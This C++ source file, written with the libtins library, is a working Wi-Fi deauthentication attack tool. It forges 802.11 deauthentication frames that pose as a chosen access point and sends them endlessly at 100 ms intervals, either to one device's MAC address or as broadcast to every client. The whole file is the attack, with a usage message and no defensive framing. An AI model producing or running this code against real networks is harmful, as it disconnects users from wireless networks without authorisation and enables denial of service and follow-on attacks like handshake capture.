#include <tins/tins.h>
#include <cassert>
#include <iostream>
#include <string>
#include <unistd.h>

using namespace Tins;
using namespace std;
enum{CMD, INTERFACE, AP_MAC, DEST_MAC};

int main(int argc, char * argv[] ) {
	if(argc != 3 && argc != 4){
		cout<<"using <inter face> <ap_mac> [<dest_mac>]"<<endl;
		return -1;
	}
	
	string Inf = argv[INTERFACE];	// network interface name

	if(argc == 4){		
		Dot11Deauthentication deauth;
		
		string dst_mac = argv[DEST_MAC];	// station device mac address
		string ap_mac = argv[AP_MAC];	// ap mac address

		deauth.addr1(dst_mac);	// set device mac address
		deauth.addr2(ap_mac);	// set ap mac address
		deauth.addr3(deauth.addr2());	// set bssid (option)

		RadioTap radio = RadioTap() / deauth;	// make 802.11 packet
		
		//PacketWriter writer("/tmp/output.pcap", PacketWriter::DOT11);
		//writer.write(deauth);
		//TESTing code

		while(1){	
			PacketSender sender(Inf);	// set packet sender & device
			sender.send(radio);		// send packet
			usleep(100000);	// delay
		}
	} else if(argc == 3){
		Dot11Deauthentication deauth;
		
		string dst_mac = "ff:ff:ff:ff:ff:ff";	// broadcast
		string ap_mac = argv[AP_MAC];	// ap mac address

		deauth.addr1(dst_mac);	// set device mac address
		deauth.addr2(ap_mac);	// set ap mac address
		deauth.addr3(deauth.addr2());	// set bssid (necessarily) 
		
		RadioTap radio = RadioTap() / deauth;	// make 802.11 packet
		while(1){	
			PacketSender sender(Inf);	// set packet sender & device
			sender.send(radio);		// send packet 
			usleep(100000);	// delay
		}
	}
}	
